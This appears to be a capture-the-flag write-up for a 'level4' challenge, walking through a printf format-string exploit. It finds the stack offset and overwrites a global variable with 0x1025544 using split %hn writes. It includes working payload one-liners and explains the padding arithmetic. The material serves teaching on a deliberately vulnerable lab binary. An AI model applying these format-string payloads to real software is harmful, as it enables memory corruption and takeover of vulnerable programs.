# Write large data

Printf Vulnerability

## Context

Same as level 3, we have a printf vulnerability.

```c
void p(char *param_1)
{
  printf(param_1);
  return;
}
```

And we try to modifie again the global variable `m`, store int .bss section.

```bash
objdump -D level4 | grep -A 2 '<m>'                                                                      (main✱) 
08049810 <m>:
 8049810:	00 00                	add    %al,(%eax)
```

## Offset of the buffer

```bash
$> ./level4                                                                                                 (main✱) 
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAf7f76f84.ffa7b7d0.f7e26000.ffa7b864.f7f9ab80.ffa7b798.804848d.ffa7b590.200.f7e26620.0.41414141.252e7825.78252e78

$> ./level4                                                                                                 (main✱) 
AAAA%12$x
AAAA41414141
```

We can conclued, the buffer is stored a the 12th addresses on our stack `%12$x`.

## Verification

Lets try write data inside to be sure it work : 

```c
gef➤  r < <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"%12$n")')

    0x804848d <n+54>           mov    eax, ds:0x8049810
 →  0x8048492 <n+59>           cmp    eax, 0x1025544

$eax   : 0x4       
```

As we can see, i print $eax, the register where is store the value of <m>, and i well modifie it (0x4 instead of 0x0).

## Write larger data

In asm we see that the program compare $eax with 0x1025544 which equal 16930116 in decimal.

It will take a day if we decide print the padding with this value, we can eazely split the value.

### Theory

We have this value 0x01025544 which is store in 4 byte.

There is a technique to print data in 2 byte with printf(): `%hn` (h for half).

So let's focus first 0x0000(2 bytes) store at the address 08049810 then last 0x0000 08049810 + 2, fill them with respectively 0x5544 and 0x0102 (little endian). 


### Exploit

To sum up : 

```py
0x0102 = 258(in decimal) -> 08049810 + 2 + 08049812
0x5544 = 21828(in decimal) -> 08049810
```

To adjust the padding, we can follow this rule : 

`padding = [The value we want] - [The bytes alredy wrote] = [The value to set].`

High order first cause the value is lower:

High order 258 - 8 = 250 (both addresses are 4 bytes)

Low order 21828 - 258 = 21570

So final exploit is : 

```py
python2.7 -c 'import sys; sys.stdout.write(b"\x10\x98\x04\x08" + b"\x12\x98\x04\x08" + b"%250x" + b"%13$hn" + b"%21570x" + b"%12$hn")' | ./level4
```

- `b"\x10\x98\x04\x08"` is the first address.
- `b"\x12\x98\x04\x08"` is the second address.

so `%12$x` point to first address and `%13$x` to the second.

- `b"%250x"` is the first padding (remember 250 + 8 byte address = 258 = 0x102)
- `b"%13$hn"` we store 258 inside the second address because its little endian.
- `b"%21570x"` is the second padding (0x5544 - 0x102)
- `b"%12$hn"` is the first address, we store the value.

Bingo, `\x10\x98\x04\x08` point to 0x1025544 !